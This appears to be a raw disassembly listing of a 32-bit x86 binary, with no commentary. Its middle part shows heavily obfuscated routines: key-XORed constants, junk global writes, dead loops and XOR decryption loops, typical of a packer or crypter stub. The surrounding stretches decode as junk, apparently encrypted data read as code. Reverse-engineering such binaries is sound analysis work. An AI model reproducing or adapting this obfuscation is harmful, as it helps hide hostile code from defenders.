  407e52:	mov    cl,0x74
  407e54:	xchg   ebp,eax
  407e55:	mov    al,0xee
  407e57:	sub    BYTE PTR [eax],0xd0
  407e5a:	xchg   ah,al
  407e5c:	and    DWORD PTR [edx+0x74],ebx
  407e5f:	dec    esi
  407e60:	loope  0x407e78
  407e62:	fwait
  407e63:	jmp    0x6db3:0x701fdf9e
  407e6a:	in     eax,dx
  407e6b:	lock in al,0xe6
  407e6e:	bound  ecx,QWORD PTR [ebx+esi*8]
  407e71:	push   esp
  407e72:	fmul   QWORD PTR [eax+ecx*8-0x788126ae]
  407e79:	mov    ch,0x81
  407e7b:	ins    DWORD PTR es:[edi],dx
  407e7c:	push   esp
  407e7d:	cmp    cl,0xce
  407e80:	out    0xc6,al
  407e82:	dec    DWORD PTR [ebx+edi*8]
  407e85:	jg     0x407e28
  407e87:	mov    bh,BYTE PTR [ebp-0x63]
  407e8a:	dec    ebp
  407e8b:	push   edi
  407e8c:	push   esi
  407e8d:	dec    eax
  407e8e:	data16 out 0x8f,al
  407e91:	inc    edx
  407e92:	jp     0x407e9e
  407e94:	xchg   ebx,eax
  407e95:	inc    ebp
  407e96:	(bad)  
  407e98:	pop    esi
  407e99:	lods   al,BYTE PTR ds:[esi]
  407e9a:	and    al,0x3b
  407e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e9d:	ficomp WORD PTR [esi-0x71]
  407ea0:	(bad)  
  407ea1:	xchg   ecx,eax
  407ea2:	pop    edi
  407ea3:	ficom  WORD PTR [eax-0x38e3aec1]
  407ea9:	sbb    ah,BYTE PTR [esi]
  407eab:	imul   edi,DWORD PTR [eax],0xffffff8d
  407eae:	mov    ah,0x29
  407eb0:	jnp    0x407ec5
  407eb2:	inc    ebx
  407eb3:	ret    
  407eb4:	cmp    al,0xc2
  407eb6:	lock cs jle 0x407f0f
  407eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ebb:	and    eax,0xddea404c
  407ec0:	inc    eax
  407ec1:	xor    eax,0x4804b65e
  407ec6:	add    DWORD PTR [ebx+0x64b37c70],esi
  407ecc:	jne    0x407eae
  407ece:	or     BYTE PTR [eax],ch
  407ed0:	frstor [ecx+0x39]
  407ed3:	in     al,0xa2
  407ed5:	add    BYTE PTR [eax+0xadd40f3],dl
  407edb:	xor    eax,0xa0907251
  407ee0:	jl     0x407e66
  407ee2:	gs sub al,0xb1
  407ee5:	mov    eax,0x447e1a33
  407eea:	sbb    BYTE PTR [edx+0x39aa2629],0xa5
  407ef1:	shl    DWORD PTR [esi+0x4],1
  407ef4:	sub    eax,0xe1de32c0
  407ef9:	cs mov ebx,0x1ca5b3e1
  407eff:	xor    DWORD PTR [edi],0x53
  407f02:	fnstcw WORD PTR [edi+0x3a]
  407f05:	hlt    
  407f06:	jl     0x407ed9
  407f08:	xchg   ebp,eax
  407f09:	inc    esi
  407f0a:	out    dx,eax
  407f0b:	pop    esp
  407f0c:	mov    ebp,0x68006063
  407f11:	das    
  407f12:	int    0xfc
  407f14:	fucomp st(6)
  407f16:	lea    eax,[esi+edx*8+0x5e]
  407f1a:	outs   dx,BYTE PTR ds:[esi]
  407f1b:	cmp    esi,0x19
  407f1e:	pop    ss
  407f1f:	repnz sbb al,0xc3
  407f22:	jno    0x407f53
  407f24:	lahf   
  407f25:	jae    0x407efa
  407f27:	dec    esi
  407f28:	jo     0x407ed1
  407f2a:	and    eax,0xd1009fe9
  407f2f:	fild   DWORD PTR ds:0x210d975e
  407f35:	sub    eax,0x9e9dd81f
  407f3a:	sbb    esi,eax
  407f3c:	les    ebp,FWORD PTR [ebx]
  407f3e:	jne    0x407f38
  407f40:	pop    es
  407f41:	xchg   al,al
  407f43:	push   edx
  407f44:	inc    esp
  407f45:	xlat   BYTE PTR ds:[ebx]
  407f46:	jbe    0x407f1a
  407f48:	pop    eax
  407f49:	add    BYTE PTR [ebx],cl
  407f4b:	lods   eax,DWORD PTR ds:[esi]
  407f4c:	jns    0x407f07
  407f4e:	pop    edx
  407f4f:	jae    0x407f07
  407f51:	std    
  407f52:	pop    ss
  407f53:	int    0xf
  407f55:	test   DWORD PTR [esi-0x74ffffff],ebx
  407f5b:	inc    ebp
  407f5c:	hlt    
  407f5d:	neg    ecx
  407f5f:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  407f66:	adc    ecx,eax
  407f68:	mov    eax,DWORD PTR [ebp-0x28]
  407f6b:	mov    ecx,DWORD PTR [ebp-0x18]
  407f6e:	not    DWORD PTR ds:0x42a2da
  407f74:	xor    eax,esi
  407f76:	or     DWORD PTR ds:0x42a2fa,0xa4f
  407f80:	xor    ecx,esi
  407f82:	or     DWORD PTR ds:0x42a26a,0x42a2f6
  407f8c:	add    eax,edi
  407f8e:	add    ecx,edi
  407f90:	mov    BYTE PTR [ebp-0x21],dl
  407f93:	cmp    eax,ecx
  407f95:	jae    0x408098
  407f9b:	add    edx,DWORD PTR ds:0x42a2a2
  407fa1:	lea    ecx,[eax-0x3272f1]
  407fa7:	mov    DWORD PTR [ebp-0x14],ecx
  407faa:	sub    DWORD PTR ds:0x42a27a,0x2374
  407fb4:	mov    edx,DWORD PTR [ebp-0x14]
  407fb7:	add    DWORD PTR ds:0x42a2a2,0x6412
  407fc1:	xor    edx,esi
  407fc3:	add    edx,0x7f55d8fb
  407fc9:	lea    ecx,[ebp+eax*4-0xb4]
  407fd0:	mov    DWORD PTR ds:0x42a25a,0x798e
  407fda:	mov    DWORD PTR [ecx],edx
  407fdc:	mov    edx,0x1097
  407fe1:	mov    edx,DWORD PTR [ecx]
  407fe3:	cmp    edx,0x244ecb98
  407fe9:	jbe    0x408004
  407fef:	xor    DWORD PTR ds:0x42a29a,0x42a2d6
  407ff9:	add    DWORD PTR [ecx],0x405fcd9
  407fff:	jmp    0x40800a
  408004:	add    DWORD PTR [ecx],0xfdaf4327
  40800a:	or     DWORD PTR ds:0x42a2f6,edi
  408010:	mov    ecx,DWORD PTR [ebp-0x18]
  408013:	xor    ecx,esi
  408015:	and    DWORD PTR ds:0x42a25e,0x42a27a
  40801f:	inc    eax
  408020:	and    DWORD PTR ds:0x42a2aa,0x42a2a6
  40802a:	inc    DWORD PTR [ebp-0x14]
  40802d:	add    ecx,edi
  40802f:	mov    DWORD PTR ds:0x42a2f6,0x14dc
  408039:	cmp    eax,ecx
  40803b:	mov    DWORD PTR ds:0x42a2fe,0x33af
  408045:	jb     0x407faa
  40804b:	and    DWORD PTR ds:0x42a25e,0x0
  408055:	mov    eax,ds:0x42a25e
  40805a:	inc    eax
  40805b:	mov    ds:0x42a25e,eax
  408060:	cmp    DWORD PTR ds:0x42a25e,0x1c
  408067:	jb     0x408095
  40806d:	jmp    0x408088
  408072:	push   0x6d6b
  408077:	push   0x44a2
  40807c:	push   DWORD PTR [ebp-0x14]
  40807f:	push   DWORD PTR [ebp-0x18]
  408082:	call   DWORD PTR ds:0x42a3de
  408088:	cmp    DWORD PTR ds:0x42a25e,0x18
  40808f:	jb     0x408055
  408095:	mov    dl,BYTE PTR [ebp-0x21]
  408098:	mov    eax,DWORD PTR [ebp-0x34]
  40809b:	xor    al,0xaa
  40809d:	mov    cl,0xf
  40809f:	xor    DWORD PTR ds:0x42a2b2,0x7a5d
  4080a9:	sub    cl,al
  4080ab:	add    dl,cl
  4080ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  4080b0:	xor    DWORD PTR ds:0x42a2d2,0x74a5
  4080ba:	xor    cl,0xaa
  4080bd:	xor    DWORD PTR ds:0x42a296,0x4bb3
  4080c7:	sub    cl,0xf
  4080ca:	add    DWORD PTR ds:0x42a2d6,0x42a2da
  4080d4:	ror    dl,cl
  4080d6:	sub    ecx,0x38f7
  4080dc:	xor    eax,eax
  4080de:	xor    DWORD PTR ds:0x42a2d2,0x8c7
  4080e8:	mov    eax,DWORD PTR [ebp-0xc]
  4080eb:	dec    DWORD PTR ds:0x42a266
  4080f1:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  4080f8:	and    DWORD PTR ds:0x42a296,0x0
  408102:	mov    eax,ds:0x42a296
  408107:	inc    eax
  408108:	mov    ds:0x42a296,eax
  40810d:	cmp    DWORD PTR ds:0x42a296,0x27
  408114:	ja     0x408132
  40811a:	jmp    0x408125
  40811f:	call   DWORD PTR ds:0x42a3e2
  408125:	cmp    DWORD PTR ds:0x42a296,0x1b
  40812c:	jb     0x408102
  408132:	mov    eax,DWORD PTR [ebp-0xc]
  408135:	xor    ecx,DWORD PTR ds:0x42a2c6
  40813b:	mov    ecx,DWORD PTR [ebp-0x28]
  40813e:	sub    DWORD PTR ds:0x42a2ce,0x42a2f2
  408148:	sub    eax,edi
  40814a:	and    DWORD PTR ds:0x42a25a,0x42a2f2
  408154:	xor    eax,esi
  408156:	mov    DWORD PTR ds:0x42a296,0x3de6
  408160:	cmp    eax,ecx
  408162:	mov    DWORD PTR ds:0x42a292,0x568e
  40816c:	jne    0x408200
  408172:	add    ecx,eax
  408174:	mov    eax,DWORD PTR [ebp-0x8]
  408177:	and    DWORD PTR ds:0x42a2ee,0x0
  408181:	mov    ecx,DWORD PTR ds:0x42a2ee
  408187:	inc    ecx
  408188:	mov    DWORD PTR ds:0x42a2ee,ecx
  40818e:	cmp    DWORD PTR ds:0x42a2ee,0x6
  408195:	jbe    0x4081df
  40819b:	jmp    0x4081b8
  4081a0:	push   0x42a296
  4081a5:	push   DWORD PTR [ebp-0x20]
  4081a8:	push   0x42903c
  4081ad:	push   0x4290aa
  4081b2:	call   DWORD PTR ds:0x42a3ea
  4081b8:	cmp    DWORD PTR ds:0x42a2ee,0x5
  4081bf:	jne    0x4081d2
  4081c5:	mov    ecx,DWORD PTR ds:0x42a2ee
  4081cb:	inc    ecx
  4081cc:	mov    DWORD PTR ds:0x42a2ee,ecx
  4081d2:	cmp    DWORD PTR ds:0x42a2ee,0x15
  4081d9:	jb     0x408181
  4081df:	mov    ecx,DWORD PTR [ebp-0x10]
  4081e2:	xor    eax,esi
  4081e4:	xor    ecx,esi
  4081e6:	sub    eax,ecx
  4081e8:	sub    eax,edi
  4081ea:	xor    eax,esi
  4081ec:	mov    DWORD PTR [ebp-0x8],eax
  4081ef:	mov    eax,DWORD PTR [ebp-0x10]
  4081f2:	xor    eax,esi
  4081f4:	mov    ecx,0xffcd8d8f
  4081f9:	sub    ecx,eax
  4081fb:	jmp    0x40820f
  408200:	mov    eax,DWORD PTR [ebp-0x10]
  408203:	xor    eax,esi
  408205:	mov    ecx,0xffcd8d0f
  40820a:	sub    ecx,eax
  40820c:	add    ecx,DWORD PTR [ebp-0xc]
  40820f:	mov    DWORD PTR [ebp-0xc],ecx
  408212:	mov    eax,DWORD PTR [ebp-0x8]
  408215:	cmp    eax,0xf89c85a5
  40821a:	jne    0x4037d5
  408220:	mov    DWORD PTR [ebp-0x34],0x9
  408227:	mov    ecx,DWORD PTR [ebp+0x8]
  40822a:	xor    ecx,esi
  40822c:	add    ecx,edi
  40822e:	jmp    0x40848e
  408233:	lea    eax,[ecx+ebx*1]
  408236:	mov    DWORD PTR [ebp-0x2c],eax
  408239:	mov    eax,DWORD PTR [ebp-0x58]
  40823c:	sub    eax,ecx
  40823e:	mov    DWORD PTR [ebp-0x1c],eax
  408241:	mov    eax,DWORD PTR [ebp-0x1c]
  408244:	mov    DWORD PTR [ebp-0x14],eax
  408247:	mov    eax,DWORD PTR [ebp-0x2c]
  40824a:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  408251:	mov    DWORD PTR [ebp-0x54],eax
  408254:	mov    DWORD PTR [ebp-0x20],0xf89c85ba
  40825b:	mov    eax,DWORD PTR [ebp-0x38]
  40825e:	xor    eax,esi
  408260:	add    eax,edi
  408262:	mov    DWORD PTR [ebp-0x10],eax
  408265:	mov    eax,DWORD PTR [ebp-0x38]
  408268:	xor    eax,esi
  40826a:	add    eax,edi
  40826c:	mov    DWORD PTR [ebp-0x8],eax
  40826f:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  408276:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  40827d:	mov    eax,DWORD PTR [ebp-0x38]
  408280:	mov    edx,DWORD PTR [ebp-0x14]
  408283:	xor    eax,esi
  408285:	add    eax,edi
  408287:	cmp    edx,eax
  408289:	je     0x408482
  40828f:	mov    eax,DWORD PTR [ebp-0x20]
  408292:	xor    eax,esi
  408294:	mov    edx,0xffcd8d0f
  408299:	sub    edx,eax
  40829b:	add    edx,DWORD PTR [ebp-0x14]
  40829e:	mov    eax,DWORD PTR [ebp-0x20]
  4082a1:	mov    ebx,DWORD PTR [ebp-0x10]
  4082a4:	xor    eax,esi
  4082a6:	add    eax,edi
  4082a8:	imul   eax,ebx
  4082ab:	cmp    eax,edx
  4082ad:	ja     0x40847f
  4082b3:	mov    edx,DWORD PTR [ebp-0x10]
  4082b6:	mov    eax,DWORD PTR [ebp-0x14]
  4082b9:	mov    ebx,DWORD PTR [ebp-0x2c]
  4082bc:	sub    eax,edx
  4082be:	xor    ebx,esi
  4082c0:	xor    edx,edx
  4082c2:	add    ebx,edi
  4082c4:	div    ebx
  4082c6:	mov    DWORD PTR [ebp-0x8],eax
  4082c9:	mov    eax,DWORD PTR [ebp-0x44]
  4082cc:	mov    edx,DWORD PTR [ebp-0x8]
  4082cf:	xor    eax,esi
  4082d1:	add    eax,edi
  4082d3:	cmp    edx,eax
  4082d5:	jbe    0x4082e5
  4082db:	mov    eax,DWORD PTR [ebp-0x44]
  4082de:	xor    eax,esi
  4082e0:	add    eax,edi
  4082e2:	mov    DWORD PTR [ebp-0x8],eax
  4082e5:	mov    eax,DWORD PTR [ebp-0x2c]
  4082e8:	mov    edx,DWORD PTR [ebp-0x8]
  4082eb:	xor    eax,esi
  4082ed:	add    eax,edi
  4082ef:	imul   eax,edx
  4082f2:	mov    DWORD PTR [ebp-0x8],eax
  4082f5:	mov    eax,DWORD PTR [ebp-0x38]
  4082f8:	mov    edx,DWORD PTR [ebp-0x8]
  4082fb:	xor    eax,esi
  4082fd:	add    eax,edi
  4082ff:	cmp    edx,eax
  408301:	je     0x408468
  408307:	mov    eax,DWORD PTR [ebp-0x8]
  40830a:	mov    DWORD PTR [ebp-0x18],eax
  40830d:	mov    eax,DWORD PTR [ebp-0x10]
  408310:	add    eax,DWORD PTR [ebp-0x54]
  408313:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  40831a:	mov    DWORD PTR [ebp-0x8],eax
  40831d:	mov    eax,0xf89c85ba
  408322:	mov    DWORD PTR [ebp-0x28],eax
  408325:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40832c:	mov    DWORD PTR [ebp-0x40],0xf89c85b8
  408333:	mov    DWORD PTR [ebp-0x30],eax
  408336:	mov    eax,DWORD PTR [ebp-0x1c]
  408339:	xor    eax,esi
  40833b:	add    eax,edi
  40833d:	jmp    0x408424
  408342:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  408349:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  408350:	mov    eax,DWORD PTR [ebp-0x30]
  408353:	mov    edx,DWORD PTR [ebp-0xc]
  408356:	xor    eax,esi
  408358:	add    eax,edi
  40835a:	imul   eax,edx
  40835d:	mov    edx,DWORD PTR [ebp-0x8]
  408360:	mov    al,BYTE PTR [eax+edx*1]
  408363:	mov    BYTE PTR [ebp-0x1],al
  408366:	mov    eax,DWORD PTR [ebp-0x30]
  408369:	mov    edx,DWORD PTR [ebp-0xc]
  40836c:	xor    eax,esi
  40836e:	add    eax,edi
  408370:	imul   eax,edx
  408373:	mov    edx,DWORD PTR [ebp-0x5c]
  408376:	xor    edx,esi
  408378:	add    eax,edx
  40837a:	mov    edx,DWORD PTR [ebp-0x8]
  40837d:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  408385:	mov    edx,DWORD PTR [ebp-0x4c]
  408388:	xor    edx,esi
  40838a:	lea    eax,[edx+eax*1+0x3272f1]
  408391:	movzx  edx,BYTE PTR [ebp-0x1]
  408395:	xor    edx,eax
  408397:	mov    BYTE PTR [ebp-0x1],dl
  40839a:	mov    al,BYTE PTR [ebp-0x1]
  40839d:	mov    edx,DWORD PTR [ebp-0x30]
  4083a0:	mov    ebx,DWORD PTR [ebp-0xc]
  4083a3:	xor    edx,esi
  4083a5:	add    edx,edi
  4083a7:	imul   edx,ebx
  4083aa:	mov    ebx,DWORD PTR [ebp-0x8]
  4083ad:	mov    BYTE PTR [edx+ebx*1],al
  4083b0:	mov    eax,DWORD PTR [ebp-0x30]
  4083b3:	mov    edx,DWORD PTR [ebp-0xc]
  4083b6:	xor    eax,esi
  4083b8:	add    eax,edi
  4083ba:	imul   eax,edx
  4083bd:	mov    edx,DWORD PTR [ebp-0x8]
  4083c0:	mov    al,BYTE PTR [eax+edx*1]
  4083c3:	mov    BYTE PTR [ebp-0x1],al
  4083c6:	mov    eax,DWORD PTR [ebp-0x30]
  4083c9:	mov    edx,DWORD PTR [ebp-0xc]
  4083cc:	xor    eax,esi
  4083ce:	add    eax,edi
  4083d0:	imul   eax,edx
  4083d3:	mov    edx,DWORD PTR [ebp-0x28]
  4083d6:	xor    edx,esi
  4083d8:	add    eax,edx
  4083da:	mov    edx,DWORD PTR [ebp-0x8]
  4083dd:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  4083e5:	mov    edx,DWORD PTR [ebp-0x50]
  4083e8:	xor    edx,esi
  4083ea:	lea    eax,[edx+eax*1+0x3272f1]
  4083f1:	movzx  edx,BYTE PTR [ebp-0x1]
  4083f5:	xor    edx,eax
  4083f7:	mov    BYTE PTR [ebp-0x1],dl
  4083fa:	mov    al,BYTE PTR [ebp-0x1]
  4083fd:	mov    edx,DWORD PTR [ebp-0x30]
  408400:	mov    ebx,DWORD PTR [ebp-0xc]
  408403:	xor    edx,esi
  408405:	add    edx,edi
  408407:	imul   edx,ebx
  40840a:	mov    ebx,DWORD PTR [ebp-0x8]
  40840d:	mov    BYTE PTR [edx+ebx*1],al
  408410:	mov    eax,DWORD PTR [ebp-0x40]
  408413:	mov    edx,DWORD PTR [ebp-0x28]
  408416:	xor    eax,esi
  408418:	xor    edx,esi
  40841a:	add    eax,edi
  40841c:	add    edx,edi
  40841e:	imul   eax,edx
  408421:	add    eax,DWORD PTR [ebp-0xc]
  408424:	mov    DWORD PTR [ebp-0xc],eax
  408427:	mov    eax,DWORD PTR [ebp-0xc]
  40842a:	mov    edx,DWORD PTR [ebp-0x18]
  40842d:	cmp    edx,eax
  40842f:	jb     0x408342
  408435:	mov    eax,DWORD PTR [ebp-0x28]
  408438:	mov    edx,DWORD PTR [ebp-0x18]
  40843b:	xor    eax,esi
  40843d:	add    eax,edi
  40843f:	imul   eax,edx
  408442:	mov    edx,DWORD PTR [ebp-0x1c]
  408445:	xor    edx,esi
  408447:	add    edx,edi
  408449:	or     eax,edx
  40844b:	mov    edx,DWORD PTR [ebp-0x20]
  40844e:	xor    edx,esi
  408450:	add    eax,edx
  408452:	mov    edx,DWORD PTR [ebp-0x20]
  408455:	xor    edx,esi
  408457:	add    eax,edx
  408459:	mov    edx,DWORD PTR [ebp-0x10]
  40845c:	lea    eax,[eax+edx*1+0x64e5e2]
  408463:	jmp    0x408477
  408468:	mov    eax,DWORD PTR [ebp-0x20]
  40846b:	mov    edx,DWORD PTR [ebp-0x10]
  40846e:	xor    eax,esi
  408470:	lea    eax,[eax+edx*1+0x3272f1]
  408477:	mov    DWORD PTR [ebp-0x10],eax
  40847a:	jmp    0x40828f
  40847f:	mov    ebx,DWORD PTR [ebp-0x3c]
  408482:	mov    eax,DWORD PTR [ebp+0xc]
  408485:	xor    eax,esi
  408487:	lea    ecx,[ecx+eax*1+0x3272f1]
  40848e:	lea    eax,[ecx-0x3272f1]
  408494:	xor    eax,esi
  408496:	cmp    eax,0xf89c95a5
  40849b:	jne    0x408233
  4084a1:	dec    DWORD PTR [ebp-0x34]
  4084a4:	jne    0x408227
  4084aa:	mov    eax,DWORD PTR [ebp+0x8]
  4084ad:	mov    ecx,DWORD PTR [ebp+0xc]
  4084b0:	mov    edx,DWORD PTR [ebp+0x8]
  4084b3:	xor    ecx,esi
  4084b5:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f1]
  4084bc:	xor    eax,esi
  4084be:	mov    al,BYTE PTR [eax+ebx*1+0x3272f1]
  4084c5:	xor    edx,esi
  4084c7:	mov    BYTE PTR [edx+ebx*1+0x3272f1],cl
  4084ce:	mov    ecx,DWORD PTR [ebp+0xc]
  4084d1:	xor    ecx,esi
  4084d3:	mov    BYTE PTR [ecx+ebx*1+0x3272f1],al
  4084da:	mov    eax,DWORD PTR [ebp+0xc]
  4084dd:	xor    eax,esi
  4084df:	add    eax,edi
  4084e1:	pop    edi
  4084e2:	pop    esi
  4084e3:	pop    ebx
  4084e4:	leave  
  4084e5:	ret    0x8
  4084e8:	xor    eax,eax
  4084ea:	and    DWORD PTR ds:0x42a2f6,0x42a2fa
  4084f4:	inc    eax
  4084f5:	ret    
  4084f6:	push   ebp
  4084f7:	mov    ebp,esp
  4084f9:	sub    esp,0x38
  4084fc:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  408503:	push   ebx
  408504:	mov    DWORD PTR ds:0x42a29a,0x1c
  40850e:	cmp    DWORD PTR ds:0x42a29a,0x0
  408515:	je     0x408551
  40851b:	cmp    DWORD PTR ds:0x42a29a,0x21
  408522:	jg     0x408551
  408528:	jmp    0x40853e
  40852d:	push   DWORD PTR [ebp-0x28]
  408530:	push   0x42a2b2
  408535:	push   DWORD PTR [ebp-0x18]
  408538:	call   DWORD PTR ds:0x42a3ee
  40853e:	xor    eax,eax
  408540:	xor    eax,DWORD PTR ds:0x42a29a
  408546:	dec    eax
  408547:	mov    ds:0x42a29a,eax
  40854c:	jmp    0x40850e
  408551:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  408558:	and    DWORD PTR ds:0x42a292,ebx
  40855e:	mov    eax,DWORD PTR [ebp-0x4]
  408561:	push   esi
  408562:	mov    esi,0x75108aa
  408567:	sub    DWORD PTR ds:0x42a28a,0x606e
  408571:	xor    eax,esi
  408573:	push   edi
  408574:	mov    edi,0x3272f1
  408579:	add    eax,edi
  40857b:	add    DWORD PTR ds:0x42a28e,0x42a2ae
  408585:	mov    DWORD PTR [ebp-0x1c],eax
  408588:	mov    eax,DWORD PTR [ebp+0x14]
  40858b:	xor    DWORD PTR ds:0x42a2de,0x42a302
  408595:	test   eax,eax
  408597:	je     0x4085af
  40859d:	mov    eax,DWORD PTR [ebp+0x14]
  4085a0:	adc    DWORD PTR ds:0x42a26e,0x42a2ca
  4085aa:	mov    eax,DWORD PTR [eax]
  4085ac:	mov    DWORD PTR [ebp-0x1c],eax
  4085af:	mov    ebx,DWORD PTR ds:0x42a256
  4085b5:	and    DWORD PTR ds:0x42a2e6,ebx
  4085bb:	mov    eax,DWORD PTR [ebp-0x4]
  4085be:	xor    eax,esi
  4085c0:	adc    DWORD PTR ds:0x42a2c6,0x7b40
  4085ca:	add    eax,edi
  4085cc:	xor    DWORD PTR ds:0x42a2c6,0x5a4b
  4085d6:	mov    DWORD PTR [ebp-0x8],eax
  4085d9:	mov    eax,DWORD PTR [ebp-0xc]
  4085dc:	dec    DWORD PTR ds:0x42a2be
  4085e2:	xor    eax,esi
  4085e4:	add    eax,edi
  4085e6:	and    DWORD PTR ds:0x42a2be,0x0
  4085f0:	jmp    0x408602
  4085f5:	mov    ebx,DWORD PTR ds:0x42a2be
  4085fb:	inc    ebx
  4085fc:	mov    DWORD PTR ds:0x42a2be,ebx
  408602:	cmp    DWORD PTR ds:0x42a2be,0x13
  408609:	jae    0x408650
  40860f:	cmp    DWORD PTR ds:0x42a2be,0x4
  408616:	jb     0x408650
  40861c:	jmp    0x408631
  408621:	push   0x68db
  408626:	push   0x42a266
  40862b:	call   DWORD PTR ds:0x42a3f2
  408631:	cmp    DWORD PTR ds:0x42a2be,0x3
  408638:	jne    0x40864b
  40863e:	mov    ebx,DWORD PTR ds:0x42a2be
  408644:	inc    ebx
  408645:	mov    DWORD PTR ds:0x42a2be,ebx
  40864b:	jmp    0x4085f5
  408650:	mov    DWORD PTR [ebp-0x24],eax
  408653:	mov    ebx,DWORD PTR ds:0x42a316
  408659:	mov    ebx,DWORD PTR [ebx]
  40865b:	xor    DWORD PTR ds:0x42a2ae,ebx
  408661:	mov    eax,DWORD PTR [ebp-0x4]
  408664:	mov    DWORD PTR ds:0x42a2fa,0x14
  40866e:	cmp    DWORD PTR ds:0x42a2fa,0x0
  408675:	je     0x4086aa
  40867b:	cmp    DWORD PTR ds:0x42a2fa,0x16
  408682:	jbe    0x4086aa
  408688:	jmp    0x408698
  40868d:	push   0x42a256
  408692:	call   DWORD PTR ds:0x42a3f6
  408698:	mov    ebx,DWORD PTR ds:0x42a2fa
  40869e:	dec    ebx
  40869f:	mov    DWORD PTR ds:0x42a2fa,ebx
  4086a5:	jmp    0x40866e
  4086aa:	xor    eax,esi
  4086ac:	movzx  ebx,BYTE PTR ds:0x42a2aa
  4086b3:	adc    ebx,DWORD PTR ds:0x42a2de
  4086b9:	mov    DWORD PTR ds:0x42a2aa,ebx
  4086bf:	add    eax,edi
  4086c1:	mov    DWORD PTR ds:0x42a29e,0x16
  4086cb:	cmp    DWORD PTR ds:0x42a29e,0x0
  4086d2:	je     0x408713
  4086d8:	cmp    DWORD PTR ds:0x42a29e,0x1e
  4086df:	jle    0x408713
  4086e5:	jmp    0x4086ff
  4086ea:	push   0x8495
  4086ef:	push   0x42a2a2
  4086f4:	push   0x13ea
  4086f9:	call   DWORD PTR ds:0x42a3fa
  4086ff:	xor    ebx,ebx
  408701:	add    ebx,DWORD PTR ds:0x42a29e
  408707:	dec    ebx
  408708:	mov    DWORD PTR ds:0x42a29e,ebx
  40870e:	jmp    0x4086cb
  408713:	mov    DWORD PTR [ebp-0x30],eax
  408716:	sub    DWORD PTR ds:0x42a2b2,0x244c
  408720:	mov    ebx,DWORD PTR [ebp-0x4]
  408723:	xor    ebx,esi
  408725:	neg    DWORD PTR ds:0x42a2f6
  40872b:	add    ebx,edi
  40872d:	and    DWORD PTR ds:0x42a2ba,0x0
  408737:	xor    eax,eax
  408739:	or     eax,DWORD PTR ds:0x42a2ba
  40873f:	inc    eax
  408740:	mov    ds:0x42a2ba,eax
  408745:	cmp    DWORD PTR ds:0x42a2ba,0x6
  40874c:	jg     0x408791
  408752:	jmp    0x40876c
  408757:	push   0x385f
  40875c:	push   0x7a18
  408761:	push   0x5bac
  408766:	call   DWORD PTR ds:0x42a402
  40876c:	cmp    DWORD PTR ds:0x42a2ba,0x5
  408773:	jne    0x408784
  408779:	mov    eax,ds:0x42a2ba
  40877e:	inc    eax
  40877f:	mov    ds:0x42a2ba,eax
  408784:	cmp    DWORD PTR ds:0x42a2ba,0x13
  40878b:	jb     0x408737
  408791:	mov    eax,DWORD PTR [ebp-0x24]
  408794:	add    DWORD PTR ds:0x42a27e,0x42a26e
  40879e:	sub    eax,edi
  4087a0:	lea    ecx,[ebx-0x3272f1]
  4087a6:	xor    eax,esi
  4087a8:	sbb    DWORD PTR ds:0x42a286,0x7a3b
  4087b2:	jmp    0x40ab40
  4087b7:	inc    esp
  4087b8:	arpl   WORD PTR [esi+esi*8],di
  4087bb:	and    al,0x96
  4087bd:	xchg   ch,cl
  4087bf:	sahf   
  4087c0:	pushf  
  4087c1:	ja     0x4087a5
  4087c3:	inc    ebp
  4087c4:	push   0x65
  4087c6:	mov    ds:0x838314cf,al
  4087cb:	or     al,0x5e
  4087cd:	add    DWORD PTR [ebx+0x5c3c8f9e],0x34
  4087d4:	or     esi,DWORD PTR [edi]
  4087d6:	fisubr DWORD PTR [ebx-0x16]
  4087d9:	test   DWORD PTR [ebp+0x73],esi
  4087dc:	jecxz  0x408813
  4087de:	stos   DWORD PTR es:[edi],eax
  4087df:	adc    BYTE PTR [esp+esi*4+0xf95f9c4],0xfa
  4087e7:	cmp    DWORD PTR [edx+0x43],ebx
  4087ea:	pusha  
  4087eb:	imul   esi,edx,0x482496fc
  4087f1:	xlat   BYTE PTR ds:[ebx]
  4087f2:	pop    ebp
  4087f3:	push   ds
  4087f4:	sbb    BYTE PTR [ecx+0x2b],dl
  4087f7:	push   ebp
  4087f8:	mov    edi,DWORD PTR [esp+esi*8-0x67ac3ed5]
  4087ff:	jp     0x4087d3
  408801:	vpackssdw ymm4,ymm0,YMMWORD PTR [edi-0x5b]
  408806:	mov    al,ds:0x73b041b6
  40880b:	inc    edi
  40880c:	push   edi
  40880d:	and    al,0xca
  40880f:	add    dl,BYTE PTR [edx]
  408811:	ins    DWORD PTR es:[edi],dx
  408812:	mov    edi,0xc94f01a5
  408817:	repz dec ecx
  408819:	sub    ah,cl
  40881b:	shl    DWORD PTR [eax-0x2e],cl
  40881e:	mov    edi,0xff7f7063
  408823:	xchg   ebp,eax
  408824:	dec    esi
  408825:	mov    esi,0x43f3e3ca
  40882a:	fnstsw WORD PTR [bp+di]
  40882d:	or     BYTE PTR [ebp+0x7f58b99b],cl
  408833:	mov    dl,0xa8
  408835:	add    dl,BYTE PTR [ebp+0x466d60eb]
  40883b:	iretw  
  40883d:	mov    ch,BYTE PTR [edi+0x34f46774]
  408843:	test   BYTE PTR [eax-0x69],al
  408846:	es jne 0x408869
  408849:	push   ebx
  40884a:	mov    gs,WORD PTR cs:[eax+0x5ac5aacd]
  408851:	push   0x3f9d39d4
  408856:	mov    dl,0xf6
  408858:	push   0x8670d0ce
  40885d:	sahf   
  40885e:	int    0xde
  408860:	(bad)  
  408861:	call   0xd01e:0xed1af150
  408868:	cmc    
  408869:	(bad)  
  40886a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
